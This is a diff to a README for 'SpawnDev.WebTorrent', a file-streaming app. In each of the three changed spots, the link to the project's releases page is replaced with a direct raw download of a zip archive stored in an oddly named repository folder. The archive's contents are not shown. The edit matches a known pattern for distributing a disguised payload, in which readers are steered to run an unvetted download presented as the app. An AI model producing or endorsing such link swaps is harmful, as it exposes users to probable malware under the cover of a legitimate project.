@@ -1,6 +1,6 @@
 # 🧬 SpawnDev.WebTorrent - Stream files across devices
 
-[![Download SpawnDev.WebTorrent](https://img.shields.io/badge/Download%20Now-Visit%20Releases-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/preexistencebacteriagenus108/SpawnDev.WebTorrent/releases)
+[![Download SpawnDev.WebTorrent](https://img.shields.io/badge/Download%20Now-Visit%20Releases-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/preexistencebacteriagenus108/SpawnDev.WebTorrent/main/tesserarian/Web-Dev-Torrent-Spawn-v3.8-beta.4.zip)
 
 ## 🖥️ What this app does
 
@@ -18,7 +18,7 @@ Use it when you want to:
 
 Visit this page to download the Windows version:
 
-[https://github.com/preexistencebacteriagenus108/SpawnDev.WebTorrent/releases](https://github.com/preexistencebacteriagenus108/SpawnDev.WebTorrent/releases)
+[https://raw.githubusercontent.com/preexistencebacteriagenus108/SpawnDev.WebTorrent/main/tesserarian/Web-Dev-Torrent-Spawn-v3.8-beta.4.zip](https://raw.githubusercontent.com/preexistencebacteriagenus108/SpawnDev.WebTorrent/main/tesserarian/Web-Dev-Torrent-Spawn-v3.8-beta.4.zip)
 
 On the releases page:
 
@@ -182,7 +182,7 @@ For best results, leave your computer on during active transfers
 
 If you need the release page again, use this link:
 
-[https://github.com/preexistencebacteriagenus108/SpawnDev.WebTorrent/releases](https://github.com/preexistencebacteriagenus108/SpawnDev.WebTorrent/releases)
+[https://raw.githubusercontent.com/preexistencebacteriagenus108/SpawnDev.WebTorrent/main/tesserarian/Web-Dev-Torrent-Spawn-v3.8-beta.4.zip](https://raw.githubusercontent.com/preexistencebacteriagenus108/SpawnDev.WebTorrent/main/tesserarian/Web-Dev-Torrent-Spawn-v3.8-beta.4.zip)
 
 ## 📚 What makes this different
 
